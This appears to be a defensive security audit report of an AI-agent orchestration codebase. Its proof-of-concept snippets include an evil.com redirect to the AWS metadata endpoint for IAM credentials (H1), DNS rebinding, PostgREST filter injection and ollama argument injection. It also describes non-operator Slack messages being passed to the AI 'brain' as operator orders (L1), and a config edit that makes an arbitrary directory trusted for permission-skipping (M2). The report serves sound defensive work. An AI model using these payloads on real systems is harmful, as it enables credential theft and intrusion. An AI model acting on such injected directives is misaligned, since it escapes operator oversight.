# Adversarial Security Review R6

> **Date:** 2026-03-29
> **Reviewer:** Claude (Directive #221)
> **Scope:** All files in `commander/src/ironclaude/`
> **Previous Rounds:** R1-R5 + Code Review (all fixes verified)

## Executive Summary

Eighth security assessment (sixth adversarial review) of the ironclaude codebase. Eight new findings identified: 2 HIGH, 4 MEDIUM, 2 LOW. All previous fixes from R1-R5 and the code review are correctly implemented with no regressions.

The most critical finding is an SSRF bypass via HTTP redirect following in the research MCP server — the DNS-based SSRF protection added in R5 is defeated by a single redirect hop to an internal address. The second HIGH finding is a PostgREST operator injection in the Supabase query interface that bypasses the filter validation added in R5.

---

## Findings

### H1: SSRF via HTTP Redirect Following

**Severity:** HIGH
**File:** `commander/src/ironclaude/research_mcp.py:131`
**Introduced:** Original code; not addressed by R5 DNS fix

#### Description

The `_validate_url()` function (lines 28-79) performs thorough validation including DNS resolution to block SSRF. However, `web_fetch()` calls `requests.get(url, timeout=30)` at line 131 **without `allow_redirects=False`**. By default, `requests.get()` follows up to 30 HTTP redirects. Redirect targets are never validated by `_validate_url()`.

This completely bypasses the R5 DNS-resolution SSRF fix: an attacker hosts a page on a public IP that returns a 302 redirect to an internal address.

#### Attack Scenario

1. Attacker controls `evil.com` (public IP `1.2.3.4`)
2. `evil.com/redir` responds: `HTTP 302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Brain calls `web_fetch("http://evil.com/redir")`
4. `_validate_url("http://evil.com/redir")` passes — `evil.com` resolves to public `1.2.3.4`
5. `requests.get("http://evil.com/redir")` follows the redirect to the AWS metadata endpoint
6. Response containing IAM credentials is returned to the brain

#### Proof of Concept

```python
from ironclaude.research_mcp import ResearchTools

tools = ResearchTools()
# Attacker's server at evil.com returns:
#   HTTP 302 Location: http://169.254.169.254/latest/meta-data/
result = tools.web_fetch("http://evil.com/redir")
# result contains AWS metadata (IAM credentials, instance identity, etc.)
```

Alternative targets: `http://localhost:6379/` (Redis), `http://127.0.0.1:8080/admin`, any internal service.

#### Suggested Fix

```python
# research_mcp.py:131 — disable redirect following
response = requests.get(url, timeout=30, allow_redirects=False)
```

If redirect support is needed, implement a redirect loop that validates each `Location` header through `_validate_url()` before following:

```python
def _safe_get(url: str, max_redirects: int = 5) -> requests.Response:
    for _ in range(max_redirects):
        error = _validate_url(url)
        if error:
            raise ValueError(error)
        response = requests.get(url, timeout=30, allow_redirects=False)
        if response.status_code in (301, 302, 303, 307, 308):
            url = response.headers.get("Location", "")
            continue
        return response
    raise ValueError("Too many redirects")
```

---

### H2: Supabase PostgREST Operator Injection via Filter Keys

**Severity:** HIGH
**File:** `commander/src/ironclaude/orchestrator_mcp.py:1395-1406`
**Introduced:** R5 added table/column/reserved-param validation but not filter key character validation

#### Description

The `query_supabase()` method validates filter keys against `RESERVED_SUPABASE_PARAMS` (line 1395-1397) but does **not validate the character set** of filter keys. PostgREST uses dot-separated syntax for operators on columns (e.g., `column.gt`, `column.like`, `column.in`). An attacker can inject operators by including dots in filter key names.

At line 1406, filter keys are used directly as HTTP query parameter names:
```python
for col, val in filters.items():
    params[col] = f"eq.{val}"
```

#### Attack Scenario

1. Brain calls `query_supabase(table="events", filters={"severity.neq": "info"})`.
2. Validation passes: `"severity.neq"` is not in `RESERVED_SUPABASE_PARAMS`.
3. `params["severity.neq"] = "eq.info"` is sent to Supabase.
4. PostgREST interprets `severity.neq` as "severity not-equal" — changing filter semantics from equality to negation, returning all rows where severity != info.

More dangerous variants:
- `{"created_at.gt": "2020-01-01"}` — bypasses equality filter to get all rows after a date
- `{"id.in": "(1,2,3,4,5)"}` — batch extraction via IN operator
- `{"severity.like": "*"}` — wildcard pattern matching

#### Proof of Concept

```python
from ironclaude.orchestrator_mcp import OrchestratorTools

tools = OrchestratorTools(...)  # with valid Supabase config
# Intended: filter where severity equals "error"
# Actual: filter where severity is NOT "error" (returns everything else)
result = tools.query_supabase(
    table="events",
    filters={"severity.neq": "error"}
)
```

#### Suggested Fix

Validate filter keys against a strict alphanumeric-plus-underscore regex:

```python
import re
_SAFE_COLUMN_RE = re.compile(r'^[a-zA-Z][a-zA-Z0-9_]*$')

# Inside query_supabase(), before the existing RESERVED_SUPABASE_PARAMS check:
for key in filters:
    if not _SAFE_COLUMN_RE.match(key):
        return {"error": f"Invalid filter column name: {key!r}"}
```

---

### M1: DNS Rebinding TOCTOU in SSRF Protection

**Severity:** MEDIUM
**File:** `commander/src/ironclaude/research_mcp.py:62-131`
**Introduced:** R5 DNS resolution fix created the TOCTOU gap

#### Description

The R5 fix added DNS resolution checking in `_validate_url()` (line 62: `socket.getaddrinfo(hostname, None)`). However, `requests.get()` at line 131 performs its **own independent DNS resolution**. Between the validation check and the HTTP request, an attacker controlling a DNS server can change the response (DNS rebinding).

#### Attack Scenario

1. Attacker controls DNS for `rebind.attacker.com` with TTL=0.
2. First DNS query (from `_validate_url`): returns `1.2.3.4` (public IP) — passes validation.
3. Second DNS query (from `requests.get`): returns `127.0.0.1` — connects to localhost.
4. The time window is small (sub-second) but DNS rebinding attacks are well-documented and tooling exists (e.g., `rbndr.us`, `rebinder`).

#### Proof of Concept

```
# Using rbndr.us DNS rebinding service:
# 7f000001.01020304.rbndr.us alternates between 127.0.0.1 and 1.2.3.4

from ironclaude.research_mcp import ResearchTools
tools = ResearchTools()
# May require multiple attempts due to DNS caching
result = tools.web_fetch("http://7f000001.01020304.rbndr.us:8080/admin")
```

#### Suggested Fix

Pin DNS resolution — resolve once, then connect to the resolved IP directly:

```python
import socket

def _resolve_and_validate(url: str) -> tuple[str, str]:
    """Resolve DNS, validate IP, return (resolved_url, original_host)."""
    parsed = urlparse(url)
    hostname = parsed.hostname
    results = socket.getaddrinfo(hostname, parsed.port or (443 if parsed.scheme == 'https' else 80))
    # Validate all resolved IPs
    for family, _, _, _, sockaddr in results:
        addr = sockaddr[0]
        ip = ipaddress.ip_address(addr)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            raise ValueError(f"Blocked: {hostname} resolves to {addr}")
    # Use first resolved IP
    resolved_ip = results[0][4][0]
    resolved_url = url.replace(hostname, resolved_ip, 1)
    return resolved_url, hostname

# In web_fetch:
resolved_url, original_host = _resolve_and_validate(url)
response = requests.get(
    resolved_url,
    headers={"Host": original_host},
    timeout=30,
    allow_redirects=False,
)
```

---

### M2: `ensure_brain_trusted` Missing `.git` Check

**Severity:** MEDIUM
**File:** `commander/src/ironclaude/main.py:153-191`
**Related:** R5 fixed `ensure_worker_trusted` with realpath + .git check

#### Description

`ensure_worker_trusted()` (orchestrator_mcp.py:79-124) was hardened in R5 with `os.path.realpath()` and a `.git` directory check to prevent trusting arbitrary directories. However, `ensure_brain_trusted()` (main.py:153-191) was **not updated** — it uses only `os.path.abspath()` and has no `.git` check.

This asymmetry means the brain's working directory can trust any arbitrary path without verifying it's a legitimate git repository.

#### Attack Scenario

1. Attacker modifies `config/ironclaude.json` to set `"brain_cwd": "/tmp/attacker-controlled-dir"`.
2. Attacker creates `/tmp/attacker-controlled-dir/` (no `.git` needed).
3. Daemon starts, calls `ensure_brain_trusted("/tmp/attacker-controlled-dir")` at main.py:967.
4. `abs_cwd = os.path.abspath("/tmp/attacker-controlled-dir")` — no realpath resolution.
5. Trust entry written to `~/.claude.json` for the attacker's directory.
6. Claude Code now trusts the attacker's directory for `--dangerously-skip-permissions`.

Note: Requires filesystem access to modify the config file. However, the defense-in-depth principle that motivated the R5 worker trust fix applies equally here.

#### Proof of Concept

```bash
# Create attacker directory (no .git required)
mkdir -p /tmp/evil-brain

# Modify config
echo '{"brain_cwd": "/tmp/evil-brain"}' > config/ironclaude.json

# Start daemon — /tmp/evil-brain is now trusted in ~/.claude.json
python -m ironclaude.main
grep evil-brain ~/.claude.json  # Shows trusted entry
```

#### Suggested Fix

Apply the same hardening as `ensure_worker_trusted`:

```python
def ensure_brain_trusted(brain_cwd: str) -> None:
    claude_json_path = os.path.expanduser("~/.claude.json")
    abs_cwd = os.path.abspath(brain_cwd)
    real_cwd = os.path.realpath(abs_cwd)  # Resolve symlinks

    if not os.path.exists(os.path.join(real_cwd, ".git")):
        logger.warning(f"Refusing to trust {real_cwd!r}: no .git directory found")
        return

    # ... rest uses real_cwd instead of abs_cwd ...
```

---

### M3: Ollama Model Name Parameter Not Validated

**Severity:** MEDIUM
**File:** `commander/src/ironclaude/ollama_mcp.py:88-268`
**Related:** R5 added `from_model` validation in `create_model`

#### Description

The R5 fix added `re.fullmatch(r"^[a-zA-Z0-9:._/-]+$", from_model)` to `create_model()` at line 233. However, the `name` parameter of `create_model()` is **not validated** — and neither are the `name` parameters of `show_model()`, `pull_model()`, and `remove_model()`.

While `subprocess.run()` with a list prevents shell injection, the unvalidated `name` is passed as a positional argument to the ollama CLI. A name starting with `-` could be interpreted as a flag by the argument parser.

#### Attack Scenario

1. Brain calls `show_model(name="--help")`.
2. Executes: `["ollama", "show", "--help"]` — ollama prints help instead of showing a model.
3. Brain calls `create_model(name="-f", from_model="llama3")`.
4. Executes: `["ollama", "create", "-f", "-f", tmp_path]` — double `-f` flag, unpredictable behavior.
5. Brain calls `pull_model(name="--insecure")`.
6. Executes: `["ollama", "pull", "--insecure"]` — enables insecure HTTP pull if ollama supports it.

#### Proof of Concept

```python
from ironclaude.ollama_mcp import OllamaTools

tools = OllamaTools()

# Argument injection — ollama interprets name as a flag
result = tools.show_model("--help")
# Returns ollama help text instead of model info

result = tools.pull_model("--insecure")
# May enable insecure HTTP pull depending on ollama version
```

#### Suggested Fix

Apply the same regex validation used for `from_model` to `name` in all methods:

```python
_SAFE_MODEL_NAME_RE = re.compile(r'^[a-zA-Z0-9:._/-]+$')

def _validate_model_name(name: str) -> dict | None:
    """Return error dict if name is invalid, None if valid."""
    if not name or not _SAFE_MODEL_NAME_RE.fullmatch(name):
        return {"error": f"Invalid model name: {name!r}"}
    return None

# Apply at the top of show_model, pull_model, remove_model, create_model:
err = _validate_model_name(name)
if err:
    return err
```

---

### M4: Supabase `limit` Parameter Unbounded

**Severity:** MEDIUM
**File:** `commander/src/ironclaude/orchestrator_mcp.py:1369`
**Introduced:** Original Supabase integration; R5 added table/column validation but not limit bounds

#### Description

The `query_supabase()` method accepts `limit: int` with a default of 50 but no upper bound validation. The limit value is passed directly to Supabase as a query parameter at line 1404: `params: dict = {"select": "*", "limit": limit, ...}`.

#### Attack Scenario

1. Brain calls `query_supabase(table="events", limit=2147483647)`.
2. Supabase receives `?limit=2147483647` and attempts to return ~2 billion rows.
3. Result: Supabase resource exhaustion, connection timeout, or excessive memory allocation.
4. Legitimate queries blocked while the large request is processing.

#### Proof of Concept

```python
from ironclaude.orchestrator_mcp import OrchestratorTools

tools = OrchestratorTools(...)  # with valid Supabase config
# DoS via unbounded limit
result = tools.query_supabase(table="events", limit=999999999)
# Supabase attempts to allocate resources for ~1B rows
```

#### Suggested Fix

```python
# At the top of query_supabase(), after existing validation:
if not (1 <= limit <= 1000):
    return {"error": f"Limit must be between 1 and 1000, got {limit}"}
```

---

### L1: Slack Channel Messages Not Restricted to Operator

**Severity:** LOW
**File:** `commander/src/ironclaude/slack_commands.py:59-65`
**Context:** Defense-in-depth; depends on Slack channel access controls

#### Description

The `handle_message` event handler at line 59 filters out bot messages (`event.get("bot_id")`) but does **not check whether the message sender is the operator**. Any human user who has access to the Slack channel can send messages that are forwarded to the brain as "OPERATOR MESSAGE" (main.py:296).

The `operator_user_id` config value exists and is used for `search_operator_messages`, but is not checked in the message forwarding path.

#### Attack Scenario

1. Non-operator user joins the Slack channel (or is already a member).
2. User posts: "Deploy the production branch to staging immediately"
3. `slack_commands.py:64` creates a parsed message event.
4. `main.py:296` forwards to brain: `"OPERATOR MESSAGE (ts=...): Deploy the production branch..."`
5. Brain interprets this as a directive from the operator.

#### Suggested Fix

```python
# slack_commands.py:59-65
@app.event("message")
def handle_message(event, say):
    text = event.get("text", "")
    if not text or event.get("bot_id"):
        return
    # Only forward messages from the operator
    if event.get("user") != os.environ.get("SLACK_OPERATOR_USER_ID", ""):
        return
    parsed = parse_inbound_command(text)
    # ...
```

---

### L2: Incomplete `RESERVED_SUPABASE_PARAMS`

**Severity:** LOW
**File:** `commander/src/ironclaude/orchestrator_mcp.py:50`
**Related:** R5 added the reserved params set

#### Description

`RESERVED_SUPABASE_PARAMS` contains `{"select", "limit", "order", "offset", "count"}` but is missing PostgREST logical operators that can alter query semantics when used as filter keys:

- `and` — logical AND grouping
- `or` — logical OR grouping
- `not` — negation

These are PostgREST query parameters that change how filters are combined, not column names.

#### Attack Scenario

```python
# Brain passes "or" as a filter key
result = tools.query_supabase(
    table="events",
    filters={"or": "(severity.eq.error,severity.eq.critical)"}
)
# PostgREST interprets "or" as a logical operator, not a column filter
# Broadens query scope beyond intended equality filters
```

#### Suggested Fix

```python
RESERVED_SUPABASE_PARAMS = frozenset({
    "select", "limit", "order", "offset", "count",
    "and", "or", "not",
})
```

Note: This is a belt-and-suspenders fix alongside H2's character validation. If H2 is implemented (regex on filter keys), this becomes redundant but still good defense-in-depth.

---

## Previous Fix Verification

All fixes from R1-R5 and the code review have been verified as correctly implemented:

| Round | Fix | Status | Location |
|-------|-----|--------|----------|
| R4 | Shell metachar `&` and backtick added | VERIFIED | brain_client.py:189 — `_SHELL_METACHARACTERS` includes `"&"` and `` "`" `` |
| R4 | `$` added to metachar tuple | VERIFIED | brain_client.py:189 — `"$"` present |
| R4 | Blanket `mcp__` prefix replaced with allowlist | VERIFIED | brain_client.py:211-222 — `_MCP_ALLOWED_PREFIXES` with explicit deny for `mcp__orchestrator__game_` |
| R4 | `shlex.quote` on model names | VERIFIED | main.py:655, orchestrator_mcp.py:820 — `shlex.quote(model_name)` |
| R4 | `validate_safe_id` in protocol | VERIFIED | protocol.py:17-22 — `_SAFE_ID_RE = re.compile(r'^[a-zA-Z0-9_-]+$')` |
| R4 | JSON escaping in hook-logger.sh | VERIFIED | hook-logger.sh:99-107 — `json_escape` handles `\`, `"`, `\n`, `\r`, `\t` |
| R4 | Integer validation for Windows PID | VERIFIED | session-init.sh:139 — `[[ ! "$BASH_WINPID" =~ ^[0-9]+$ ]]` guard |
| R5 | SSRF DNS resolution check | VERIFIED | research_mcp.py:61-78 — `socket.getaddrinfo` with IP validation |
| R5 | Modelfile directive injection (newline strip) | VERIFIED | ollama_mcp.py:232,241 — `from_model.replace("\n","")` and `system.replace("\n","")` |
| R5 | `from_model` regex validation | VERIFIED | ollama_mcp.py:233 — `re.fullmatch(r"^[a-zA-Z0-9:._/-]+$", from_model)` |
| R5 | Trust escalation fix (realpath + .git) | VERIFIED | orchestrator_mcp.py:89-93 — `os.path.realpath` + `.git` check in `ensure_worker_trusted` |
| R5 | Supabase table/column allowlists | VERIFIED | orchestrator_mcp.py:48-50 — `VALID_SUPABASE_TABLES`, `VALID_ORDER_BY_COLUMNS`, `RESERVED_SUPABASE_PARAMS` |
| R5 | Path traversal in protocol | VERIFIED | protocol.py:71,82 — `validate_safe_id` called in both `write_worker_spec` and `read_worker_spec` |
| CR | WORKER_COMMANDS sync | VERIFIED | main.py:46-48 matches orchestrator_mcp.py:39-42 — both include `CLAUDE_CODE_EFFORT_LEVEL=high`, `opus[1m]`/`sonnet[1m]`, `exec` |
| CR | `ensure_worker_trusted` in main.py | VERIFIED | main.py:669 — calls `ensure_worker_trusted(repo)` (imported from orchestrator_mcp) |
| CR | PM marker check | VERIFIED | main.py:685 — `_wait_for_ready(session_name, timeout=15, marker="Professional Mode: ON")` |
| CR | System param sanitization | VERIFIED | ollama_mcp.py:241 — `system.replace("\n", "").replace("\r", "")` |
| CR | Dead code removal | VERIFIED | No `_wait_for_pm_activation` method in orchestrator_mcp.py |

---

## Methodology

- **Static analysis** of all Python source files in `commander/src/ironclaude/`
- **Hook script review** of all files in `worker/hooks/`
- **Parallel focused audits** on four attack surfaces: SSRF/DNS, Supabase injection, tmux command injection, trust escalation
- **Previous fix regression testing** against all R1-R5 and code review findings
- **False positive filtering**: tmux send_keys "injection" excluded because targets are Claude Code CLI instances (user prompts), not raw shells; symlink TOCTOU excluded because exploitation requires sub-millisecond filesystem manipulation in a single-threaded daemon loop

---

## Risk Matrix

| ID | Severity | Exploitability | Impact | Requires |
|----|----------|----------------|--------|----------|
| H1 | HIGH | Easy | SSRF to internal services, credential theft | Attacker-controlled URL passed to web_fetch |
| H2 | HIGH | Easy | Query scope manipulation, data extraction beyond intended filters | Brain-crafted filter keys to query_supabase |
| M1 | MEDIUM | Hard | SSRF via DNS rebinding | Attacker DNS infrastructure with TTL=0 |
| M2 | MEDIUM | Medium | Arbitrary directory trusted for Claude Code | Filesystem access to modify config |
| M3 | MEDIUM | Easy | Argument injection to ollama CLI | Brain-crafted model names |
| M4 | MEDIUM | Easy | Supabase resource exhaustion | Brain-crafted large limit values |
| L1 | LOW | Easy | Unauthorized messages to brain | Access to Slack channel |
| L2 | LOW | Easy | Query logic manipulation | Brain-crafted filter keys (defense-in-depth for H2) |
